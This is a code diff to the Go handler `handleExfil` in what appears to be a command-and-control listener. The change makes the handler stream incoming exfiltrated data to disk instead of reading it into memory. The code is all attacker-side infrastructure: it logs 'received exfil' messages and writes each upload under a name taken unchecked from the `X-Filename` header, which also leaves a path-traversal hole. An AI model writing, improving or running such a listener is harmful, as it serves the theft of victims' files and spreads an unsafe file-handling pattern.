@@ -725,17 +725,6 @@ func (hl *HTTPListener) handleExfil(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	body, err := io.ReadAll(r.Body)
-	if err != nil {
-		http.Error(w, "bad request", http.StatusBadRequest)
-		return
-	}
-
-	if len(body) == 0 {
-		http.Error(w, "empty body", http.StatusBadRequest)
-		return
-	}
-
 	filename := r.Header.Get("X-Filename")
 	if filename == "" {
 		filename = fmt.Sprintf("exfil_%d.zip", time.Now().UnixNano())
@@ -750,13 +739,22 @@ func (hl *HTTPListener) handleExfil(w http.ResponseWriter, r *http.Request) {
 	}
 
 	savePath := filepath.Join(uploadDir, filename)
-	if err := os.WriteFile(savePath, body, 0644); err != nil {
+	saveFile, err := os.Create(savePath)
+	if err != nil {
+		fmt.Printf("[!] failed to create exfil file: %v\n", err)
+		http.Error(w, "internal error", http.StatusInternalServerError)
+		return
+	}
+	defer saveFile.Close()
+
+	written, err := io.Copy(saveFile, r.Body)
+	if err != nil {
 		fmt.Printf("[!] failed to save exfil: %v\n", err)
 		http.Error(w, "internal error", http.StatusInternalServerError)
 		return
 	}
 
-	fmt.Printf("[+] received exfil from %s: %s (%d bytes)\n", r.RemoteAddr, filename, len(body))
+	fmt.Printf("[+] received exfil from %s: %s (%d bytes)\n", r.RemoteAddr, filename, written)
 
 	w.Header().Set("Content-Type", "text/plain")
 	w.WriteHeader(http.StatusOK)
